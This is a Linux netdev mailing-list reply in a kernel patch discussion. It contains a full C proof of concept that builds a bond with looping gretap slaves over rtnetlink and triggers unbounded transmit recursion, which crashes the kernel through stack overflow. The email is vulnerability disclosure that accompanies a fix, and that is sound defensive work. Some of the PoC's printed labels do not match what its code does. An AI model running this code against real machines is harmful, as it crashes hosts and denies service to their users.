Return-Path: <netdev+bounces-263046-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id iGUxO0RspmnMPgAAu9opvQ
	(envelope-from <netdev+bounces-263046-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Tue, 03 Mar 2026 06:06:12 +0100
X-Original-To: lists+netdev@lfdr.de
Received: from sto.lore.kernel.org (sto.lore.kernel.org [IPv6:2600:3c09:e001:a7::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 8120E1E91AD
	for <lists+netdev@lfdr.de>; Tue, 03 Mar 2026 06:06:12 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sto.lore.kernel.org (Postfix) with ESMTP id 772E3300D740
	for <lists+netdev@lfdr.de>; Tue,  3 Mar 2026 05:06:11 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 8D246282F05;
	Tue,  3 Mar 2026 05:06:09 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="UtcdxhF8"
X-Original-To: netdev@vger.kernel.org
Received: from mail-dl1-f47.google.com (mail-dl1-f47.google.com [74.125.82.47])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AC2451990A7
	for <netdev@vger.kernel.org>; Tue,  3 Mar 2026 05:06:07 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.47
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1772514369; cv=none; b=nquTnUDwbeXeXzxG4Gs/YeZInvlw/HWDPKkAEzJ4jJHO33dRpAXGxJbfJ2xe11+J/OIxHhngx2v+Tqe+LwkaCUI2c/AiXuB51Mugu3DxlvgdgihRpKBif5Nkkn/SXf9rLtTD9RR+huKYO6taFBSCeNSCnMutDr30pTI4nvyyNvs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1772514369; c=relaxed/simple;
	bh=nTkSs4UmhmF2Jg4DsbGhlHj+YDFT3Q5ui/cSxZjFAPk=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=sYT7BQ0kgNRqmRl2q8ZFGDyJb6D6QvKtIaCVRmxOfcE4+5DWvSuVryQ+MmpaVCYfjUBN5iztaOter/9gaVrunvXDvMr3vjSAGV/QRtLUJMzGKnhPQlEsU00lke5n533HHdLQguTWsC2kiSsVDCtQDceYxJqir/xnKoUb+HGBFww=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=UtcdxhF8; arc=none smtp.client-ip=74.125.82.47
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-dl1-f47.google.com with SMTP id a92af1059eb24-12732e6a123so910412c88.1
        for <netdev@vger.kernel.org>; Mon, 02 Mar 2026 21:06:07 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1772514367; x=1773119167; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=YS39wDVmqFmK7ipo9+4K/tYrftqOUm/LN5bWx4uTMU0=;
        b=UtcdxhF8IvHjlC0LOFPQaF+IQO0cukO6H+YOvZWcYur8/oX2Bd9gYVaXh1jOSG5t1U
         zKik4kB3vZsjrdxTyoYOXI6mjM5FdOoA/ONgScbTLxLJF46MpQ5V3eAXFujC6mHE+iTw
         0ryGHyctxDjmZdmV6LHWqMGArH6T6WKbYrFVtgF2m2bGoXlS0zjN3DWoe204i5tVLcM+
         KF0xEHpbo0rYjAx8/q72tl9CBrZszNsXtNBpIBuz1DV4lQoMEi9YCNsT47qJ0d7rLNqV
         FJnQniMXqjpJt6PKNCAuwEEAOKeIRQWsKInkbIweBELcfKpSWDJIAHOvE9sFSlfOQOSO
         qmYA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1772514367; x=1773119167;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=YS39wDVmqFmK7ipo9+4K/tYrftqOUm/LN5bWx4uTMU0=;
        b=qnQp9GvG6zXBNZR0QfrtCH0qtCwH3gO0nabCfbN8FMqvkCo3xXQ0vYT0AR8i7SoJou
         3W4cIaNUnmchgraXgbFMf8Z3vFzMVbK9I0KUoBaMmJsMOtYtLWRxgvzhlolJunEe7FeX
         j32BktigrQJq4KvY60zJG2gdBS65qx5lQTXNIv7j5eGGYAF0drPEGH3YMWOkWmusWpTE
         EE76V+jLs9QdJfBt5a0Yep6WTecPAVwJogoRdJfAz5mnB2a2o3duPwief9Hm6CBz3VRf
         fqvg/Yu14mqJRaHtLPpo94G7eOpM+cee47DwybZRCRh4Vniaszh2ni/v9oEftHNoWiXs
         xozQ==
X-Forwarded-Encrypted: i=1; AJvYcCV4XBXc2ghTNExIvt1I6j2C1oi3iHT+vFZAoNuNCnLnKAbRUG1V4+5oB/TEZlhgcZMdbcs/6z0=@vger.kernel.org
X-Gm-Message-State: AOJu0YzB3IroIf8W5BNRVAO3EoicSRM5p2eRAoX6AIw8/u1n7Fm247yO
	G6waLoOvMTt2Vpawn2p3IEt2IaCI2BDiePnIeZrxHejADGGU4dQJKJybwxjx0StoJQ==
X-Gm-Gg: ATEYQzyuXirWp9alTWc3z7edlde/tSO7WfL7IUYahyGHYd8MD2+TyFXhysv2cEWZPJk
	dAFTk4p1IGWzD7TnWAT8J3WwSzHx9HjEp1kvXP/fFCFO5EqJUG5fiW8zQJul9ST/AwB31Wunre/
	sjmFu6mpv90VR0pPwUc9j8yswsKSmGWOwl4rh5wXOcY39e1LJbVTDFhD5EAdWcyLpgDH5Yhnd2A
	DsmxuPkl5KRnJz9q0OARszylpYCMVlQuM9xhbAVdz0lf6nK6W/7OxpeKe5JN3gDPBM6IMuWwFMS
	hk+Xu13cwztUPtuIAKYQTmkyUdubJVfWregwiSwrL8ec2VeJ2WZBWKtH1CsEluVrU0EN+YgUVmK
	UpoF0ZrQmfVQ/TLXwa+/0BKclkakHtYl7m4oAE3RNiMf5PMmr0QPsB4RUvKmldGtoTR+idC7KUN
	W8GtvqRXdLh9Io2hURqJGSCGo0CzNLdg==
X-Received: by 2002:a05:7022:7a5:b0:127:3480:7c9e with SMTP id a92af1059eb24-1278fc99574mr6418284c88.8.1772514366584;
        Mon, 02 Mar 2026 21:06:06 -0800 (PST)
Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-1279cbd1993sm6889996c88.2.2026.03.02.21.06.05
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 02 Mar 2026 21:06:06 -0800 (PST)
Date: Mon, 2 Mar 2026 22:06:04 -0700
From: Xiang Mei <xmei5@asu.edu>
To: Eric Dumazet <edumazet@google.com>
Cc: bestswngs@gmail.com, security@kernel.org, davem@davemloft.net, 
	kuba@kernel.org, pabeni@redhat.com, horms@kernel.org, netdev@vger.kernel.org, 
	linux-kernel@vger.kernel.org
Subject: Re: [PATCH net] net/core: add xmit recursion limit to qdisc transmit
 path
Message-ID: <uaearjv7z3u5e3hks775qzlzoxcxsrhd3vl2rc3xo7n2mntlfd@ostyhlddj2a4>
References: <20260303022947.3061602-2-bestswngs@gmail.com>
 <CANn89i+mK-CqGPeW65RBeOe2R-YjqjxU9W9AGbvV1Ef+HS4DtA@mail.gmail.com>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <CANn89i+mK-CqGPeW65RBeOe2R-YjqjxU9W9AGbvV1Ef+HS4DtA@mail.gmail.com>
X-Rspamd-Queue-Id: 8120E1E91AD
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-1.66 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	MID_RHS_NOT_FQDN(0.50)[];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c09:e001:a7::/64:c];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FREEMAIL_CC(0.00)[gmail.com,kernel.org,davemloft.net,redhat.com,vger.kernel.org];
	TAGGED_FROM(0.00)[bounces-263046-lists,netdev=lfdr.de];
	FROM_HAS_DN(0.00)[];
	DKIM_TRACE(0.00)[asu.edu:+];
	RCVD_TLS_LAST(0.00)[];
	MIME_TRACE(0.00)[0:+];
	FORGED_SENDER_MAILLIST(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	ASN(0.00)[asn:63949, ipnet:2600:3c09::/32, country:SG];
	TO_DN_SOME(0.00)[];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	MISSING_XM_UA(0.00)[];
	NEURAL_HAM(-0.00)[-0.994];
	TAGGED_RCPT(0.00)[netdev];
	RCPT_COUNT_SEVEN(0.00)[9];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sto.lore.kernel.org:rdns,sto.lore.kernel.org:helo,asu.edu:dkim]
X-Rspamd-Action: no action

On Tue, Mar 03, 2026 at 05:30:11AM +0100, Eric Dumazet wrote:
> On Tue, Mar 3, 2026 at 3:37 AM <bestswngs@gmail.com> wrote:
> >
> > From: Weiming Shi <bestswngs@gmail.com>
> >
> > __dev_queue_xmit() has two transmit code paths depending on whether the
> > device has a qdisc attached:
> >
> >   1. Qdisc path (q->enqueue): calls __dev_xmit_skb()
> >   2. No-qdisc path: calls dev_hard_start_xmit() directly
> >
> > Commit 745e20f1b626 ("net: add a recursion limit in xmit path") added
> > recursion protection to the no-qdisc path via dev_xmit_recursion()
> > check and dev_xmit_recursion_inc()/dec() tracking. However, the qdisc
> > path performs no recursion depth checking at all.
> >
> > This allows unbounded recursion through qdisc-attached devices. For
> > example, a bond interface in broadcast mode with gretap slaves whose
> > remote endpoints route back through the bond creates an infinite
> > transmit loop that exhausts the kernel stack:
> 
> Non lltx drivers would deadlock in HARD_TX_LOCK().
> 
> I would prefer we try to fix this issue at configuration time instead
> of adding yet another expensive operations in the fast path.
>
Thanks for the review and advice.
Weiming is going to discuss more about the paching when he get back to his
computer.

> Can you provide a test ?

Here is a PoC. It may trigger other crashes since the uncontrolled stack
increasing, the expected crash is 
"BUG: KASAN: stack-out-of-bounds in __unwind_start+0x2f/0x7a0".

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_link.h>
#include <linux/if_tunnel.h>
#include <linux/ip.h>
#include <linux/neighbour.h>
#include <arpa/inet.h>
#include <sched.h>

extern unsigned int if_nametoindex(const char *__ifname);

#ifndef IFF_UP
#define IFF_UP 0x1
#endif

struct nlmsg {
    char *pos;
    int nesting;
    struct nlattr *nested[8];
    char buf[8192];
};

static void nl_init(struct nlmsg *nlmsg, int typ, int flags,
                    const void *data, int size)
{
    memset(nlmsg, 0, sizeof(*nlmsg));
    struct nlmsghdr *hdr = (struct nlmsghdr *)nlmsg->buf;
    hdr->nlmsg_type = typ;
    hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
    memcpy(hdr + 1, data, size);
    nlmsg->pos = (char *)(hdr + 1) + NLMSG_ALIGN(size);
}

static void nl_attr(struct nlmsg *nlmsg, int typ, const void *data, int size)
{
    struct nlattr *attr = (struct nlattr *)nlmsg->pos;
    attr->nla_len = sizeof(*attr) + size;
    attr->nla_type = typ;
    if (size > 0)
        memcpy(attr + 1, data, size);
    nlmsg->pos += NLMSG_ALIGN(attr->nla_len);
}

static void nl_nest(struct nlmsg *nlmsg, int typ)
{
    struct nlattr *attr = (struct nlattr *)nlmsg->pos;
    attr->nla_type = typ;
    nlmsg->pos += sizeof(*attr);
    nlmsg->nested[nlmsg->nesting++] = attr;
}

static void nl_done(struct nlmsg *nlmsg)
{
    struct nlattr *attr = nlmsg->nested[--nlmsg->nesting];
    attr->nla_len = nlmsg->pos - (char *)attr;
}

static int nl_send(struct nlmsg *nlmsg, int sock)
{
    struct nlmsghdr *hdr = (struct nlmsghdr *)nlmsg->buf;
    hdr->nlmsg_len = nlmsg->pos - nlmsg->buf;

    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
    ssize_t n = sendto(sock, nlmsg->buf, hdr->nlmsg_len, 0,
                       (struct sockaddr *)&addr, sizeof(addr));
    if (n != (ssize_t)hdr->nlmsg_len)
        return -1;

    n = recv(sock, nlmsg->buf, sizeof(nlmsg->buf), 0);
    if (n < 0)
        return -1;
    if (n < (ssize_t)(sizeof(struct nlmsghdr) + sizeof(struct nlmsgerr)))
        return -1;

    hdr = (struct nlmsghdr *)nlmsg->buf;
    if (hdr->nlmsg_type == NLMSG_ERROR) {
        int err = -((struct nlmsgerr *)(hdr + 1))->error;
        if (err) {
            errno = err;
            return -err;
        }
    }
    return 0;
}

static int create_device(int sock, struct nlmsg *nlmsg, const char *name,
                         const char *kind)
{
    struct ifinfomsg hdr = {};
    nl_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
    nl_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
    nl_nest(nlmsg, IFLA_LINKINFO);
    nl_attr(nlmsg, IFLA_INFO_KIND, kind, strlen(kind));
    nl_done(nlmsg);
    int ret = nl_send(nlmsg, sock);
    printf("  create %s (%s): %s\n", name, kind, ret ? strerror(errno) : "ok");
    return ret;
}

static int create_bond(int sock, struct nlmsg *nlmsg, const char *name, int mode)
{
    struct ifinfomsg hdr = {};
    nl_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
    nl_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
    nl_nest(nlmsg, IFLA_LINKINFO);
    nl_attr(nlmsg, IFLA_INFO_KIND, "bond", 4);
    nl_nest(nlmsg, IFLA_INFO_DATA);
    uint8_t bond_mode = mode;
    nl_attr(nlmsg, IFLA_BOND_MODE, &bond_mode, sizeof(bond_mode));
    nl_done(nlmsg);
    nl_done(nlmsg);
    int ret = nl_send(nlmsg, sock);
    printf("  create bond %s (mode=%d): %s\n", name, mode, ret ? strerror(errno) : "ok");
    return ret;
}

static int create_gretap(int sock, struct nlmsg *nlmsg, const char *name,
                         uint32_t remote, int num_tx_queues)
{
    struct ifinfomsg hdr = {};
    nl_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
    nl_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
    uint32_t ntxq = num_tx_queues;
    nl_attr(nlmsg, IFLA_NUM_TX_QUEUES, &ntxq, sizeof(ntxq));
    nl_nest(nlmsg, IFLA_LINKINFO);
    nl_attr(nlmsg, IFLA_INFO_KIND, "gretap", 6);
    nl_nest(nlmsg, IFLA_INFO_DATA);
    nl_attr(nlmsg, IFLA_GRE_REMOTE, &remote, sizeof(remote));
    nl_done(nlmsg);
    nl_done(nlmsg);
    int ret = nl_send(nlmsg, sock);
    printf("  create gretap %s (remote, %d txq): %s\n", name, num_tx_queues,
           ret ? strerror(errno) : "ok");
    return ret;
}

static int set_master(int sock, struct nlmsg *nlmsg, const char *slave,
                      const char *master)
{
    struct ifinfomsg hdr = {};
    hdr.ifi_index = if_nametoindex(slave);
    if (!hdr.ifi_index) return -1;
    nl_init(nlmsg, RTM_NEWLINK, 0, &hdr, sizeof(hdr));
    int master_idx = if_nametoindex(master);
    nl_attr(nlmsg, IFLA_MASTER, &master_idx, sizeof(master_idx));
    int ret = nl_send(nlmsg, sock);
    printf("  enslave %s -> %s: %s\n", slave, master, ret ? strerror(errno) : "ok");
    return ret;
}

static int dev_updown(int sock, struct nlmsg *nlmsg, const char *name, int up)
{
    struct ifinfomsg hdr = {};
    hdr.ifi_index = if_nametoindex(name);
    if (!hdr.ifi_index) return -1;
    hdr.ifi_flags = up ? IFF_UP : 0;
    hdr.ifi_change = IFF_UP;
    nl_init(nlmsg, RTM_NEWLINK, 0, &hdr, sizeof(hdr));
    int ret = nl_send(nlmsg, sock);
    printf("  %s %s: %s\n", up ? "up" : "down", name, ret ? strerror(errno) : "ok");
    return ret;
}

static int add_addr4(int sock, struct nlmsg *nlmsg, const char *dev,
                     const char *addr_str, int prefix)
{
    struct ifaddrmsg hdr = {};
    hdr.ifa_family = AF_INET;
    hdr.ifa_prefixlen = prefix;
    hdr.ifa_scope = RT_SCOPE_UNIVERSE;
    hdr.ifa_index = if_nametoindex(dev);
    struct in_addr addr;
    inet_pton(AF_INET, addr_str, &addr);
    nl_init(nlmsg, RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
    nl_attr(nlmsg, IFA_LOCAL, &addr, sizeof(addr));
    nl_attr(nlmsg, IFA_ADDRESS, &addr, sizeof(addr));
    int ret = nl_send(nlmsg, sock);
    printf("  addr %s %s/%d: %s\n", dev, addr_str, prefix, ret ? strerror(errno) : "ok");
    return ret;
}

static int add_addr6(int sock, struct nlmsg *nlmsg, const char *dev,
                     const char *addr_str, int prefix)
{
    struct ifaddrmsg hdr = {};
    hdr.ifa_family = AF_INET6;
    hdr.ifa_prefixlen = prefix;
    hdr.ifa_scope = RT_SCOPE_UNIVERSE;
    hdr.ifa_index = if_nametoindex(dev);
    struct in6_addr addr;
    inet_pton(AF_INET6, addr_str, &addr);
    nl_init(nlmsg, RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
    nl_attr(nlmsg, IFA_LOCAL, &addr, sizeof(addr));
    nl_attr(nlmsg, IFA_ADDRESS, &addr, sizeof(addr));
    int ret = nl_send(nlmsg, sock);
    printf("  addr6 %s %s/%d: %s\n", dev, addr_str, prefix, ret ? strerror(errno) : "ok");
    return ret;
}

static int create_veth(int sock, struct nlmsg *nlmsg, const char *name,
                       const char *peer)
{
    struct ifinfomsg hdr = {};
    nl_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
    nl_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
    nl_nest(nlmsg, IFLA_LINKINFO);
    nl_attr(nlmsg, IFLA_INFO_KIND, "veth", 4);
    nl_nest(nlmsg, IFLA_INFO_DATA);
    nl_nest(nlmsg, 1 /* VETH_INFO_PEER */);
    nlmsg->pos += sizeof(struct ifinfomsg);
    nl_attr(nlmsg, IFLA_IFNAME, peer, strlen(peer) + 1);
    nl_done(nlmsg);
    nl_done(nlmsg);
    nl_done(nlmsg);
    int ret = nl_send(nlmsg, sock);
    printf("  create veth %s<->%s: %s\n", name, peer, ret ? strerror(errno) : "ok");
    return ret;
}

static int add_neigh4(int sock, struct nlmsg *nlmsg, const char *dev,
                      const char *addr_str, const unsigned char *mac)
{
    struct ndmsg hdr = {};
    hdr.ndm_family = AF_INET;
    hdr.ndm_ifindex = if_nametoindex(dev);
    hdr.ndm_state = NUD_PERMANENT;
    hdr.ndm_type = 0;
    nl_init(nlmsg, RTM_NEWNEIGH, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
    struct in_addr addr;
    inet_pton(AF_INET, addr_str, &addr);
    nl_attr(nlmsg, NDA_DST, &addr, sizeof(addr));
    nl_attr(nlmsg, NDA_LLADDR, mac, 6);
    int ret = nl_send(nlmsg, sock);
    printf("  neigh %s %s: %s\n", dev, addr_str, ret ? strerror(errno) : "ok");
    return ret;
}

// Debug: check if routing to dst works through devname
static void debug_route(const char *devname, const char *dst_str)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { perror("  debug: socket"); return; }

    if (setsockopt(fd, SOL_SOCKET, 25 /* SO_BINDTODEVICE */,
                   devname, strlen(devname) + 1) < 0) {
        printf("  debug: SO_BINDTODEVICE %s: %s\n", devname, strerror(errno));
    }

    struct sockaddr_in dst = {};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(9999);
    inet_pton(AF_INET, dst_str, &dst.sin_addr);

    if (connect(fd, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        printf("  debug: connect to %s via %s: %s\n", dst_str, devname, strerror(errno));
    } else {
        struct sockaddr_in local = {};
        socklen_t len = sizeof(local);
        getsockname(fd, (struct sockaddr *)&local, &len);
        char local_str[32];
        inet_ntop(AF_INET, &local.sin_addr, local_str, sizeof(local_str));
        printf("  debug: route to %s via %s OK, local=%s\n", dst_str, devname, local_str);

        // Try to actually send a packet
        char buf[64] = "test";
        ssize_t n = send(fd, buf, sizeof(buf), MSG_DONTWAIT);
        printf("  debug: send: %zd (%s)\n", n, n < 0 ? strerror(errno) : "ok");
    }
    close(fd);
}

// Send a multicast packet through bond0 to actively trigger the recursive path
static void trigger_multicast(const char *devname)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("  trigger: socket");
        return;
    }

    // Bind to device
    if (setsockopt(fd, SOL_SOCKET, 25 /* SO_BINDTODEVICE */,
                   devname, strlen(devname) + 1) < 0) {
        perror("  trigger: SO_BINDTODEVICE");
    }

    // Set multicast TTL
    int ttl = 1;
    setsockopt(fd, IPPROTO_IP, 33 /* IP_MULTICAST_TTL */, &ttl, sizeof(ttl));

    // Send to multicast address 224.0.0.1 (all-hosts)
    struct sockaddr_in dst = {};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(9999);
    inet_pton(AF_INET, "224.0.0.1", &dst.sin_addr);

    char buf[64] = "trigger";
    for (int i = 0; i < 10; i++) {
        if (sendto(fd, buf, sizeof(buf), 0,
                   (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            printf("  trigger: sendto #%d: %s\n", i, strerror(errno));
        } else {
            printf("  trigger: sent multicast #%d\n", i);
        }
        usleep(100000);
    }
    close(fd);
}

int main(int argc, char *argv[])
{
    printf("[*] PoC: KASAN slab-out-of-bounds Write in __build_flow_key\n");
    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());

    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (sock < 0) {
        perror("socket(NETLINK_ROUTE)");
        return 1;
    }

    struct nlmsg nlmsg;
    struct in_addr remote;
    inet_pton(AF_INET, "10.1.1.2", &remote);
    unsigned char fake_mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};

    // Bring up loopback first
    printf("[*] Step 0: Bring up loopback...\n");
    dev_updown(sock, &nlmsg, "lo", 1);

    printf("[*] Step 1: Create bond0 in broadcast mode (mode 3)...\n");
    create_bond(sock, &nlmsg, "bond0", 3);

    printf("[*] Step 2: Bring bond0 UP and assign IPv4...\n");
    dev_updown(sock, &nlmsg, "bond0", 1);
    add_addr4(sock, &nlmsg, "bond0", "10.1.1.1", 24);

    // Create MULTIPLE gretap tunnels, each with a DIFFERENT remote address.
    // All remotes are in the 10.1.1.0/24 subnet (reachable through bond0).
    // With broadcast mode, bond sends to all slaves. Each gretap has its OWN
    // qdisc instances (pfifo_fast with TCQ_F_NOLOCK). When bond recurses:
    // - Level 0: gretap1's qdisc runs → tunnel → back to bond
    // - Level 1: gretap1 blocked (running), gretap2 runs → tunnel → bond
    // - Level 2: gretap1,2 blocked, gretap3 runs → tunnel → bond
    // - Level 3: gretap1,2,3 blocked, gretap4 runs → tunnel → bond
    // Each level adds ~8-12KB of stack (with KASAN_STACK). With 32KB stack
    // (KASAN doubles it), 4 levels = ~40-50KB → overflow!
    // Pre-populate ARP entries BEFORE enslaving gretap devices.
    // This ensures that when IGMP/NDP is triggered by enslaving, the
    // outer GRE packets can be sent immediately (no ARP resolution queue).
    printf("[*] Step 3: Pre-populate ARP entries for all remotes...\n");
    int num_gretaps = 7;
    char gname[16], remote_str[32];
    for (int i = 0; i < num_gretaps; i++) {
        snprintf(remote_str, sizeof(remote_str), "10.1.1.%d", i + 2);
        fake_mac[5] = 0x55 + i;
        add_neigh4(sock, &nlmsg, "bond0", remote_str, fake_mac);
    }

    printf("[*] Step 4: Create 4 gretap tunnels (different remotes, 9 txq each)...\n");
    for (int i = 0; i < num_gretaps; i++) {
        snprintf(gname, sizeof(gname), "gretap%d", i + 1);
        snprintf(remote_str, sizeof(remote_str), "10.1.1.%d", i + 2);
        inet_pton(AF_INET, remote_str, &remote);
        create_gretap(sock, &nlmsg, gname, remote.s_addr, 9);
    }

    printf("[*] Step 5: Enslave all gretaps to bond0 and bring up...\n");
    for (int i = 0; i < num_gretaps; i++) {
        snprintf(gname, sizeof(gname), "gretap%d", i + 1);
        set_master(sock, &nlmsg, gname, "bond0");
        dev_updown(sock, &nlmsg, gname, 1);
    }

    printf("[*] Step 6: Trigger - Add IPv6 address (triggers DAD through bond)...\n");
    // DAD sends NDP through all slaves → gretap → tunnel → bond → recursion
    add_addr6(sock, &nlmsg, "bond0", "fd00::1", 64);
    sleep(3);

    printf("[*] Step 7: Toggle bond0 to retrigger IGMP/MLD...\n");
    dev_updown(sock, &nlmsg, "bond0", 0);
    usleep(200000);
    dev_updown(sock, &nlmsg, "bond0", 1);
    add_neigh4(sock, &nlmsg, "bond0", "10.1.1.2", fake_mac);
    add_addr6(sock, &nlmsg, "bond0", "fd01::1", 64);
    sleep(3);

    printf("[*] Step 8: Send multicast packets through bond0...\n");
    trigger_multicast("bond0");

    printf("[*] Done. Check dmesg for KASAN report.\n");
    sleep(5);
    close(sock);
    return 0;
}
```

Please let me know if it doesn't trigger the bug.

Thanks,
Xiang
> 
> Thanks.

